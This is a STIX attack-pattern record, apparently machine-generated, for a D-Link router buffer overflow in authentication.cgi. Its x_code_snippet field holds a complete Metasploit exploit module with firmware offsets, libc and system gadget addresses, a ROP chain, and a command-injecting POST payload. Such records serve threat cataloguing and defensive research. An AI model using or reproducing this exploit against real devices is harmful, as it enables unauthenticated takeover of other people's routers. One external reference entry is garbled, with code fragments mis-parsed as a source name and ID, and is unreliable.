{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2b684765-0551-44a8-bdf5-84101d639745",
    "created": "2024-08-14T17:03:03.875502Z",
    "modified": "2024-08-14T17:03:03.875505Z",
    "name": "D-Link authentication.cgi Buffer Overflow",
    "description": " This module exploits a remote buffer overflow vulnerability on several D-Link routers. The vulnerability exists in the handling of HTTP queries to the authentication.cgi with long password values. The vulnerability can be exploitable without authentication. This module has been tested successfully on D-Link firmware DIR645A1_FW103B11. Other firmwares such as the DIR865LA1_FW101b06 and DIR845LA1_FW100b20 are also vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_authentication_cgi_bof.rb",
            "external_id": "dlink_authentication_cgi_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt#originaladvisory"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-FailedtoaccessthevulnerableURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'D-Link authentication.cgi Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a remote buffer overflow vulnerability on several D-Link routers.\n        The vulnerability exists in the handling of HTTP queries to the authentication.cgi with\n        long password values. The vulnerability can be exploitable without authentication. This\n        module has been tested successfully on D-Link firmware DIR645A1_FW103B11. Other firmwares\n        such as the DIR865LA1_FW101b06 and DIR845LA1_FW100b20 are also vulnerable.\n      },\n      'Author'         =>\n        [\n          'Roberto Paleari', # Vulnerability discovery\n          'Craig Heffner',   # also discovered the vulnerability / help with some parts of this module\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module and verification on several other routers\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['linux'],\n      'Arch'           => ARCH_MIPSLE,\n      'References'     =>\n        [\n          ['OSVDB', '95951'],\n          ['EDB', '27283'],\n          ['URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10008'], #advisory on vendor web site\n          ['URL', 'http://www.dlink.com/us/en/home-solutions/connect/routers/dir-645-wireless-n-home-router-1000'], #vendor web site of router\n          ['URL', 'http://roberto.greyhats.it/advisories/20130801-dlink-dir645.txt']  #original advisory\n        ],\n      'Targets'        =>\n        [\n          [ 'D-Link DIR-645 1.03',\n            {\n              'Offset'      => 1011,\n              'LibcBase'    => 0x2aaf8000,    #Router\n              #'LibcBase'   => 0x40854000,    # QEMU environment\n              'System'      => 0x000531FF,    # address of system\n              'CalcSystem'  => 0x000158C8,    # calculate the correct address of system\n              'CallSystem'  => 0x000159CC,    # call our system\n            }\n          ]\n        ],\n      'DisclosureDate'  => '2013-02-08',\n      'DefaultTarget'   => 0))\n      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri'     => \"/authentication.cgi\",\n        'method'  => 'GET'\n      })\n\n      if res && [200, 301, 302].include?(res.code) && res.body.to_s =~ /status.*uid/\n        return Exploit::CheckCode::Detected\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Accessing the vulnerable URL...\")\n\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the vulnerable URL\")\n    end\n\n    print_status(\"Exploiting...\")\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 200,\n      :concat_operator => \" && \"\n    )\n  end\n\n  def prepare_shellcode(cmd)\n    shellcode = rand_text_alpha_upper(target['Offset'])                  # padding\n    shellcode << [target['LibcBase'] + target['System']].pack(\"V\")       # s0 - address of system\n    shellcode << rand_text_alpha_upper(16)                               # unused reg $s1 - $s4\n    shellcode << [target['LibcBase'] + target['CallSystem']].pack(\"V\")   # s5 - second gadget (call system)\n\n        # .text:000159CC 10 00 B5 27    addiu   $s5, $sp, 0x170+var_160  # get the address of our command into $s5\n        # .text:000159D0 21 28 60 02    move    $a1, $s3                 # not used\n        # .text:000159D4 21 30 20 02    move    $a2, $s1                 # not used\n        # .text:000159D8 21 C8 00 02    move    $t9, $s0\t         # $s0 - system\n        # .text:000159DC 09 F8 20 03    jalr    $t9\t                 # call system\n        # .text:000159E0 21 20 A0 02    move    $a0, $s5\t         # our cmd -> into a0 as parameter for system\n\n    shellcode << rand_text_alpha_upper(12)                               # unused registers $s6 - $fp\n    shellcode << [target['LibcBase'] + target['CalcSystem']].pack(\"V\")   # $ra - gadget nr 1 (prepare the parameter for system)\n\n        # .text:000158C8 21 C8 A0 02    move    $t9, $s5                 # s5 - our second gadget\n        # .text:000158CC 09 F8 20 03    jalr    $t9                      # jump the second gadget\n        # .text:000158D0 01 00 10 26    addiu   $s0, 1                   # s0 our system address - lets calculate the right address\n\n    shellcode << rand_text_alpha_upper(16)                               # filler in front of our command\n    shellcode << cmd\n  end\n\n  def execute_command(cmd, opts)\n    shellcode = prepare_shellcode(cmd)\n    uid = rand_text_alpha(4)\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => \"/authentication.cgi\",\n        'cookie'   => \"uid=#{uid}\",\n        'encode_params' => false,\n        'vars_post' => {\n          'uid'      => uid,\n          'password' => rand_text_alpha(3) + shellcode,\n        }\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-08",
    "x_mitre_platforms": [
        "['linux']"
    ]
}